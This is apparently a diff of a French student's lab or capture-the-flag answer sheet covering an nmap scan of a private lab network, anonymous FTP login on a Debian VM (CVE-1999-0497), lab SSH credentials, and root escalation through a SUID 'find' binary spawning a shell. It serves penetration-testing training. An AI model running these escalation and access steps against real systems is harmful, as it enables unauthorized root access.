@@ -1,26 +1,60 @@
 II. SCANNER UN RÉSEAU AVEC PYTHON ET NMAP
-II. Adresse IP de la VM Debian
-2. Combien de machines sont connectées sur le réseau ?
-Il y a trois machines connectées sur le réseau 192.168.56.1/24
-192.168.56.1
-192.168.56.55
-192.168.56.100
+    II. Adresse IP de la VM Debian
+    2. Combien de machines sont connectées sur le réseau ?
+    Il y a trois machines connectées sur le réseau 192.168.56.1/24
+    192.168.56.1
+    192.168.56.55
+    192.168.56.100
 
-3. Quelle est l'adresse IP de la machine virtuelle Debian ?
-La machine virtuelle a l'adresse IP : 192.168.56.55
+    3. Quelle est l'adresse IP de la machine virtuelle Debian ?
+    La machine virtuelle a l'adresse IP : 192.168.56.55
 
-4. Ouvrir l'invite de commande et ping la VM Debian et voir si tout fonctionne bien
-Sur l'invite de commande : ping 192.168.56.55 
--- 4 paquets sur 4 envoyés et reçus
+    4. Ouvrir l'invite de commande et ping la VM Debian et voir si tout fonctionne bien
+    Sur l'invite de commande : ping 192.168.56.55 
+    -- 4 paquets sur 4 envoyés et reçus
 
-III. Génération de rapports JSON
-2. Quels sont les services ouverts sur la VM Debian ?
-Les services ouverts sur la VM Debian sont :
-- Le service FTP
-- Le service SSH
+    III. Génération de rapports JSON
+    2. Quels sont les services ouverts sur la VM Debian ?
+    Les services ouverts sur la VM Debian sont :
+    - Le service FTP
+    - Le service SSH
 
-IV. CVE-1999-0497
-1. Exploiter la CVE : CVE-1999-0497
-Sur l'invite de commande : ftp 192.168.56.55
-Nom d'utilisateur pour accéder au service ftp est : anonymous
+    IV. CVE-1999-0497
+    1. Exploiter la CVE : CVE-1999-0497
+    Sur l'invite de commande : ftp 192.168.56.55
+    Nom d'utilisateur pour accéder au service ftp est : anonymous
+    La saisie du mot de passe n'est pas nécéssaire
 --
+
+III. LE CHIFFREMENT DE HILL
+    Cf. hill_cipher.txt
+    Les identifiants sont deby / python
+--
+
+IV. ÉLÉVATION DE PRIVILÈGES
+    Se connecter en ssh avec les identifiants : deby / python avec la commande :
+    ssh -l deby 192.168.56.55
+    Enter the password : python
+
+    1. Une fois que vous avez réussi à accèder à la machine de deby, que trouvez vous dans le dossier utilisateur ?
+    ls -> la commande find surlignée en rouge ainsi qu'un message de DSI.
+
+    2. Écrire la commande permettant d'afficher les droits existant sur "find". Que remarquez vous d'étrange ?
+    Il faut écrire la commande : ls -l
+    Sortie console :
+    -rwsr-xr-x 1 root root 224848 21 juil. 18:15 find
+    -rw------- 1 deby deby   1102 24 juil. 10:44 message-de-la-DSI.txt
+
+    Que remarquez vous d'étrange ?
+    Le SUID est activé sur la commande find.
+
+    3. Prendre connaissance du message de la DSI, celui-ci vous aidera dans la capture du second flag.
+    Il est possible de passer en root avec la commande :
+    ./find . -exec /bin/sh -p \; -quit (Cf. https://gtfobins.github.io/gtfobins/find/)
+
+
+    Chercher le dernier flag qui est un fichier texte à l'aide de la commande find et prenez conaissance de son contenu.
+    find / -name "*.txt" (Cf. https://www.quora.com/How-do-you-find-all-TXT-files-in-any-directory)
+    Le dernier flag est : /root/Felicitation.txt
+    
+
